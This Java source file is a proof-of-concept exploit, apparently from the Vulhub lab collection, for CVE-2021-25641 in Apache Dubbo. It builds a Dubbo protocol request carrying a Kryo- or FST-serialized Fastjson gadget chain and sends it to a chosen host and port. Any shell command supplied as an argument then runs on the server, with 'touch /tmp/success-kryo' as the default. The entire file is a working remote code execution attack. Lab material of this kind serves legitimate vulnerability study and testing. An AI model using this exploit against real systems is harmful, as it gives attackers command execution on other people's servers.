package org.vulhub.poc;

import org.apache.dubbo.common.URL;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.fst.FstSerialization;
import org.apache.dubbo.common.serialize.kryo.KryoSerialization;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Locale;
import java.util.Random;

public class CVE202125641 {
    private static final byte[] MAGIC = new byte[]{(byte) 0xda, (byte) 0xbb};
    private static final byte FLAG_REQUEST = (byte) 0x80;
    private static final byte FLAG_TWOWAY = (byte) 0x40;
    private static final byte KRYO_SERIALIZATION_ID = 8;
    private static final byte FST_SERIALIZATION_ID = 9;
    private static final URL DUBBO_URL = URL.valueOf("dubbo://127.0.0.1:20880");

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 3 || positional.length > 4) {
            System.err.println("Usage: CVE-2021-25641 <host> <port> <kryo|fst> [command]");
            System.err.println("Example: CVE-2021-25641 127.0.0.1 20880 kryo \"touch /tmp/success-kryo\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        SerializationMode mode = SerializationMode.fromName(positional[2]);
        String command = positional.length == 4 ? positional[3] : "touch /tmp/success-" + mode.name;

        byte[] payload = serializeDubboRequest(mode, mode.createPayload(command));
        PocUtils.send(host, port, payload);

        System.out.println("Payload sent to " + host + ":" + port + " with " + mode.name + " serialization");
    }

    private static byte[] serializeDubboRequest(SerializationMode mode, Object payload) throws Exception {
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        ObjectOutput out = mode.serialization.serialize(DUBBO_URL, body);
        try {
            out.writeUTF("2.7.7");
            out.writeUTF("org.vulhub.api.CalcService");
            out.writeUTF("");
            out.writeUTF("$echo");
            out.writeUTF("Ljava/lang/Object;");
            out.writeObject(payload);
            out.writeObject(new HashMap<String, String>());
            out.flushBuffer();
        } finally {
            if (out instanceof Cleanable) {
                ((Cleanable) out).cleanup();
            }
        }

        byte[] data = body.toByteArray();
        ByteArrayOutputStream request = new ByteArrayOutputStream();
        request.write(MAGIC);
        request.write(FLAG_REQUEST | FLAG_TWOWAY | mode.serializationId);
        request.write(0);
        writeLong(request, new Random().nextLong());
        writeInt(request, data.length);
        request.write(data);
        return request.toByteArray();
    }

    private static void writeInt(OutputStream out, int value) throws Exception {
        out.write((value >>> 24) & 0xff);
        out.write((value >>> 16) & 0xff);
        out.write((value >>> 8) & 0xff);
        out.write(value & 0xff);
    }

    private static void writeLong(OutputStream out, long value) throws Exception {
        out.write((int) ((value >>> 56) & 0xff));
        out.write((int) ((value >>> 48) & 0xff));
        out.write((int) ((value >>> 40) & 0xff));
        out.write((int) ((value >>> 32) & 0xff));
        out.write((int) ((value >>> 24) & 0xff));
        out.write((int) ((value >>> 16) & 0xff));
        out.write((int) ((value >>> 8) & 0xff));
        out.write((int) (value & 0xff));
    }

    private enum SerializationMode {
        KRYO("kryo", KRYO_SERIALIZATION_ID, new KryoSerialization()),
        FST("fst", FST_SERIALIZATION_ID, new FstSerialization());

        private final String name;
        private final byte serializationId;
        private final Serialization serialization;

        SerializationMode(String name, byte serializationId, Serialization serialization) {
            this.name = name;
            this.serializationId = serializationId;
            this.serialization = serialization;
        }

        private Object createPayload(String command) throws Exception {
            if (this == FST) {
                return FastjsonGadget.createForFst(command);
            }
            return FastjsonGadget.create(command);
        }

        private static SerializationMode fromName(String name) {
            String normalized = name.toLowerCase(Locale.ROOT);
            for (SerializationMode mode : values()) {
                if (mode.name.equals(normalized)) {
                    return mode;
                }
            }
            throw new IllegalArgumentException("Unsupported serialization: " + name);
        }
    }
}
